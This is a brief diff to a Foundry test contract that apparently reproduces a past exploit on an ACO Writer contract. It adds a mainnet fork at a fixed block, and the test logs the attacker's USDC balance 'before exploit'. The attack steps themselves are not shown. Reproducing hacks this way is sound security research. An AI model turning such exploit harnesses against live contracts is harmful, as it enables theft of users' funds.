@@ -32,10 +32,15 @@ contract MockACOToken {
 }
 
 contract ContractTest is DSTest, MockACOToken {
-
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IACOWriter acowrite = IACOWriter(payable(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f));
     IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    
+    uint256 mainnetFork;
+
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 14460635); // fork mainnet at block 14460635
+        cheats.selectFork(mainnetFork);
+    }
 
     function test() public{
         emit log_named_uint("Before exploit, USDC balance of attacker:",usdc.balanceOf(msg.sender));
